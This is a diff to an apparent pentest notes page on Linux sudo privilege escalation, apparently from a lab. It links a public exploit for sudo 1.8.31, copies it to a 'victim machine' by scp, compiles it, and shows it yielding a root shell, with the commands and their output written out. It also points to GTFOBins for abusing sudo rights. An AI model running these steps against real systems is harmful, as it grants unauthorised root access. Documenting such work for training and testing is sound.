@@ -1,6 +1,73 @@
 # Sudo
 
-sudo -l ### check sudo access
+
+
+## SUDO version exploit
+
+{% code title="checking sudo version" overflow="wrap" lineNumbers="true" %}
+```
+sudo --version
+Sudo version 1.8.31
+Sudoers policy plugin version 1.8.31
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.31
+
+```
+{% endcode %}
+
+Exploit to use
+
+{% hint style="info" %}
+[https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
+{% endhint %}
+
+1. download the code
+2. copy the exploit to the victim machine
+3. inside the directory "make"
+4. run the exploit "./exploit"
+
+{% code title="scp the code" overflow="wrap" lineNumbers="true" %}
+```
+scp -i id_ecdsa_anita -P 2222 -r Sudo-1.8.31-Root-Exploit anita@192.168.218.245:/home/anita/
+Enter passphrase for key 'id_ecdsa_anita': 
+shellcode.c                                                                                                                                                                                                                                                                               100%  599    12.9KB/s   00:00    
+README.md                                                                                                                                                                                                                                                                                 100%  692    14.4KB/s   00:00    
+exclude                                                                                                                                                                                                                                                                                   100%  240     5.1KB/s   00:00    
+pre-push.sample                                                                                                                                                                                                                                                                           100% 1374    28.5KB/s   00:00    
+pre-applypatch.sample                                                                                                                                                                                                                                                                     100%  424     9.3KB/s   00:00    
+applypatch-msg.sample                                                                                                                                                                                                                                                                     100%  478     9.4KB/s   00:00    
+fsmonitor-watchman.sample                                                                                                                                                                                                                                                                 100% 4726    96.2KB/s   00:00    
+pre-commit.sample                                
+```
+{% endcode %}
+
+{% code title="compiling the code and running it" overflow="wrap" lineNumbers="true" %}
+```
+cd Sudo-1.8.31-Root-Exploit
+$ ls -lah
+total 28K
+drwxr-xr-x 3 anita anita 4.0K Sep 30 18:19 .
+drwxr-xr-x 5 anita anita 4.0K Sep 30 18:19 ..
+-rw-r--r-- 1 anita anita 2.0K Sep 30 18:19 exploit.c
+drwxr-xr-x 8 anita anita 4.0K Sep 30 18:19 .git
+-rw-r--r-- 1 anita anita  208 Sep 30 18:19 Makefile
+-rw-r--r-- 1 anita anita  692 Sep 30 18:19 README.md
+-rw-r--r-- 1 anita anita  599 Sep 30 18:19 shellcode.c
+$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+$ ls
+exploit  exploit.c  libnss_x  Makefile  README.md  shellcode.c
+$ ./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root),998(apache),1004(anita)
+# 
+
+```
+{% endcode %}
+
+## sudo -l ### check sudo access
 
 [https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
 
